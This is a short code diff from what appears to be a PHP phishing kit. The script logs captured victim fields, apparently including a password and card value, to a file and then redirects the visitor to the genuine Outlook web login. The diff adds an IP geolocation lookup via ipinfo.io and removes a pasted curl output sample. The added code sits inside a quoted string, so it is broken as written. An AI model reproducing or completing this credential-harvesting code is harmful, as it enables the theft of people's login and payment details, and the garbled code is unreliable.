@@ -20,21 +20,16 @@ fwrite($file,
 ".$userp."
 ".$cc."
 ".$city."  
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
+echo $details->city; // -> "Mountain View"
+       
 " . PHP_EOL);
 fwrite($file, "==============================" . PHP_EOL);
 fclose($file);
 
-$ curl ipinfo.io/8.8.8.8
-{
-  "ip": "8.8.8.8",
-  "hostname": "google-public-dns-a.google.com",
-  "loc": "37.385999999999996,-122.0838",
-  "org": "AS15169 Google Inc.",
-  "city": "Mountain View",
-  "region": "CA",
-  "country": "US",
-  "phone": 650
-}
+
 
 header("location:https://outlook.live.com/owa/");
 
